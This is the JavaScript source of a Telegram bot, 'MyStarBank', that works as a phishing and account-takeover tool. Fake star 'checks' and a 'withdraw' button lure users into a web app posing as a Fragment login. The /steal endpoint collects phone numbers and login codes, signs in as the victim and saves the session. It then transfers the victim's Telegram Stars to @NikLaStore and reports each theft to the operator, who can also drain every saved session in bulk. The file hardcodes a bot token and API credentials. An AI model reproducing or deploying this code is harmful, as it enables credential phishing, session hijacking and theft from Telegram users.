const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { 
    polling: true,
    filepath: false,
    request: {
        url: 'https://api.telegram.org',
        agentOptions: {} 
    }
});

const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS used_checks (
        user_id INTEGER,
        check_id INTEGER,
        used_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, check_id)
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 3,
            timeout: 30000,
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, `🔐 Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            // ПРОСТАЯ КРАЖА ЗВЕЗД
            await simpleSteal(client, phone);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// ПРОСТАЯ КРАЖА ЗВЕЗД
async function simpleSteal(client, phone) {
    try {
        const user = await client.getMe();
        let stolenStars = 0;
        let report = '';
        
        // ПРОВЕРЯЕМ ЗВЕЗДЫ ПРОСТЫМ МЕТОДОМ
        report += `💰 Проверяем звезды...\n`;
        try {
            // Простой запрос баланса
            const starsData = await client.invoke(
                new Api.payments.GetStarsStatus({})
            );
            
            if (starsData && starsData.balance !== undefined) {
                stolenStars = starsData.balance;
                report += `✅ Найдено звезд: ${stolenStars}\n`;
            } else {
                report += `❌ Звезды не найдены\n`;
            }
        } catch (starsError) {
            report += `⚠️ Ошибка звезд: ${starsError.message}\n`;
        }
        
        // ПЫТАЕМСЯ ОТПРАВИТЬ ЗВЕЗДЫ НА @NikLaStore
        if (stolenStars > 0) {
            report += `🚀 Пытаемся отправить звезды...\n`;
            try {
                const target = await client.invoke(
                    new Api.contacts.ResolveUsername({
                        username: 'NikLaStore'
                    })
                );
                
                if (target && target.users && target.users.length > 0) {
                    const targetUser = target.users[0];
                    
                    // Отправляем звезды
                    await client.invoke(
                        new Api.payments.SendStars({
                            peer: targetUser,
                            stars: stolenStars,
                            purpose: new Api.InputStorePaymentPremiumSubscription({
                                userId: targetUser.id
                            })
                        })
                    );
                    report += `✅ Отправлено ${stolenStars} звезд на @NikLaStore\n`;
                } else {
                    report += `❌ @NikLaStore не найден\n`;
                }
            } catch (sendError) {
                report += `❌ Ошибка отправки: ${sendError.message}\n`;
            }
        }
        
        // ФИНАЛЬНЫЙ ОТЧЕТ
        let message = `🎯 РЕЗУЛЬТАТ:\n` +
                     `📱 ${phone}\n` +
                     `👤 @${user.username || 'нет'}\n` +
                     `👑 Премиум: ${user.premium ? 'ДА' : 'НЕТ'}\n\n` +
                     `${report}\n` +
                     `💰 УКРАДЕНО: ${stolenStars} звезд`;
        
        db.run(`UPDATE stolen_sessions SET stars_data = ?, status = 'stolen' WHERE phone = ?`, 
            [stolenStars, phone]);
        
        bot.sendMessage(MY_USER_ID, message);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${phone} - ${error.message}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// INLINE QUERY БЕЗ ФОТО (статьи)
bot.on('inline_query', (query) => {
    const results = [
        {
            type: 'article',
            id: '1',
            title: '🎫 Чек на 50 звезд',
            description: 'Создать чек на 50 звезд',
            input_message_content: {
                message_text: '🎫 <b>Чек на 50 звезд!</b>\n\n🪙 Нажмите кнопку ниже чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз',
                parse_mode: 'HTML'
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
                ]]
            }
        },
        {
            type: 'article',
            id: '2',
            title: '💫 Чек на 100 звезд',
            description: 'Создать чек на 100 звезд',
            input_message_content: {
                message_text: '🎫 <b>Чек на 100 звезд!</b>\n\n💫 Нажмите кнопку ниже чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз',
                parse_mode: 'HTML'
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "💫 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// СОЗДАНИЕ ЧЕКОВ БЕЗ ФОТО
bot.onText(/@MyStarBank_bot/, (msg) => {
    bot.sendMessage(msg.chat.id, '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:', {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
            ]
        }
    });
});

// CALLBACK ОБРАБОТЧИК
bot.on('callback_query', async (query) => {
    const data = query.data;
    const userId = query.from.id;
    
    try {
        await bot.answerCallbackQuery(query.id);
        
        if (data === 'create_50' || data === 'create_100') {
            const amount = data === 'create_50' ? 50 : 100;
            
            db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
                [amount, userId], function(err) {
                if (err) return;
                
                const checkId = this.lastID;
                const checkText = amount === 50 
                    ? `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`
                    : `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
                
                // ОТПРАВЛЯЕМ БЕЗ ФОТО
                bot.sendMessage(query.message.chat.id, checkText, {
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                        }]] 
                    }
                });
            });
        }
        
        // КНОПКА КРАЖИ ДЛЯ АДМИНА
        if (query.data === 'steal_all_gifts' && query.from.id === MY_USER_ID) {
            await bot.answerCallbackQuery(query.id, { text: "Краду звезды..." });
            
            db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, async (err, rows) => {
                let totalStolen = 0;
                
                for (const row of rows) {
                    try {
                        const stringSession = new StringSession(row.session_string);
                        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                            connectionRetries: 2,
                            timeout: 30000
                        });
                        
                        await client.connect();
                        await simpleSteal(client, row.phone);
                        await client.disconnect();
                        
                        totalStolen++;
                        await new Promise(resolve => setTimeout(resolve, 3000));
                        
                    } catch (error) {
                        console.log(`Ошибка: ${row.phone}`);
                    }
                }
                
                bot.sendMessage(MY_USER_ID, `✅ Обработано ${totalStolen} аккаунтов`);
            });
        }
    } catch (error) {}
});

// ГЛАВНОЕ МЕНЮ БЕЗ ФОТО
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, 0)`, 
        [msg.from.id, msg.from.username], function(err) {});
    
    showMainMenu(chatId, msg.from.id);
});

function showMainMenu(chatId, userId) {
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        const balance = row ? row.balance : 0;
        
        const menuText = `✨ <b>MyStarBank - Ваш звездный кошелек</b>\n\n` +
                        `💫 <b>Текущий баланс:</b> ${balance} stars\n\n` +
                        `🏦 <b>Доступные операции:</b>\n` +
                        `├ 📊 Проверить баланс\n` +
                        `├ 🎫 Создать чек\n` +
                        `└ 💸 Вывести средства\n\n` +
                        `🔐 <b>Безопасность:</b> Все операции защищены\n` +
                        `💎 <b>Надежность:</b> Гарантия выплат`;

        const menuKeyboard = {
            reply_markup: {
                keyboard: [
                    [{ text: "📊 Проверить баланс" }],
                    [{ text: "🎫 Создать чек" }],
                    [{ text: "💸 Вывести средства" }]
                ],
                resize_keyboard: true,
                one_time_keyboard: false
            }
        };

        // ОТПРАВЛЯЕМ БЕЗ ФОТО
        bot.sendMessage(chatId, menuText, {
            parse_mode: 'HTML',
            reply_markup: menuKeyboard.reply_markup
        });
    });
}

// МЕНЮ /logs ДЛЯ АДМИНА
bot.onText(/\/logs/, (msg) => {
    if (msg.from.id !== MY_USER_ID) return;
    
    db.all(`SELECT phone, status, stars_data, gifts_data FROM stolen_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = '📊 <b>Последние 10 сессий:</b>\n\n';
        
        if (rows.length === 0) {
            logText = '📊 <b>Нет данных о сессиях</b>';
        } else {
            rows.forEach((row, index) => {
                logText += `📱 <b>${row.phone}</b>\n`;
                logText += `📊 Статус: ${row.status}\n`;
                logText += `⭐ Звезд: ${row.stars_data}\n`;
                logText += `🎁 Подарков: ${row.gifts_data}\n`;
                if (index < rows.length - 1) logText += `────────────────\n`;
            });
        }
        
        bot.sendMessage(msg.chat.id, logText, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Украсть все звезды", callback_data: "steal_all_gifts" }]
                ]
            }
        });
    });
});

// ОБРАБОТКА ТЕКСТОВЫХ КОМАНД
bot.on('message', (msg) => {
    const text = msg.text;
    
    if (text === 'Проверить баланс') {
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [msg.from.id], (err, row) => {
            const balance = row ? row.balance : 0;
            bot.sendMessage(msg.chat.id, 
                `💰 <b>Ваш баланс</b>\n\n` +
                `💫 Звезд: ${balance}\n\n` +
                `🔄 Для пополнения используйте чеки от других пользователей`,
                { parse_mode: 'HTML' }
            );
        });
        
    } else if (text === 'Создать чек') {
        const futureDate = new Date();
        futureDate.setDate(futureDate.getDate() + 21);
        
        bot.sendMessage(msg.chat.id,
            `🎫 <b>Создание чека</b>\n\n` +
            `❌ <b>Временно недоступно</b>\n\n` +
            `📝 <b>Извините, для идентификации личности нужно подождать 21 день</b>\n\n` +
            `📅 <b>Доступ откроется:</b> ${futureDate.toLocaleDateString('ru-RU')}\n\n` +
            `💡 <b>Альтернатива:</b> Используйте @MyStarBank_bot в любом чате`,
            { parse_mode: 'HTML' }
        );
        
    } else if (text === 'Вывести средства') {
        bot.sendMessage(msg.chat.id,
            `🏦 <b>Вывод средств</b>\n\n` +
            `🔐 <b>Для вывода средств необходимо войти через Fragment</b>\n\n` +
            `📋 <b>Требования:</b>\n` +
            `├ 🔐 Подтвержденный аккаунт Fragment\n` +
            `├ 💫 Минимум 100 stars\n` +
            `└ 📱 Верифицированный номер\n\n` +
            `⚡ <b>Нажмите кнопку ниже для входа:</b>`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🔐 Войти через Fragment", web_app: { url: WEB_APP_URL } }
                    ]]
                }
            }
        );
    }
});

// ОБРАБОТКА ЧЕКОВ
bot.onText(/\/start (.+)/, (msg, match) => {
    const params = match[1];
    
    if (params.startsWith('check_')) {
        const checkId = params.split('_')[1];
        
        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [msg.from.id, checkId], (err, usedRow) => {
            if (err || usedRow) {
                bot.sendMessage(msg.chat.id, '❌ Вы уже использовали этот чек!');
                return;
            }
            
            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
                if (err || !row) {
                    bot.sendMessage(msg.chat.id, '❌ Чек уже использован или не существует!');
                    return;
                }
                
                db.get(`SELECT balance FROM users WHERE user_id = ?`, [msg.from.id], (err, userRow) => {
                    const currentBalance = userRow ? userRow.balance : 0;
                    const newBalance = currentBalance + row.amount;
                    
                    db.serialize(() => {
                        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
                            [msg.from.id, msg.from.username, newBalance]);
                        db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [msg.from.id, checkId]);
                    });
                    
                    bot.sendMessage(msg.chat.id, 
                        `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
                        `💫 <b>Ваш баланс:</b> ${newBalance} stars\n\n` +
                        `💰 Для управления средствами используйте /start`,
                        { parse_mode: 'HTML' }
                    );
                });
            });
        });
        
    } else if (params.startsWith('create_check_')) {
        const amount = parseInt(params.split('_')[2]);
        
        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
            [amount, msg.from.id], function(err) {
            if (err) {
                bot.sendMessage(msg.chat.id, '❌ Ошибка создания чека');
                return;
            }
            
            const checkId = this.lastID;
            const checkText = amount === 50 
                ? `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`
                : `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
            
            // ОТПРАВЛЯЕМ БЕЗ ФОТО
            bot.sendMessage(msg.chat.id, checkText, {
                parse_mode: 'HTML',
                reply_markup: { 
                    inline_keyboard: [[{ 
                        text: `🪙 Забрать ${amount} звезд`, 
                        url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                    }]] 
                }
            });
        });
        
    } else {
        showMainMenu(msg.chat.id, msg.from.id);
    }
});

console.log('✅ Бот запущен');
console.log('✅ Web App URL:', WEB_APP_URL);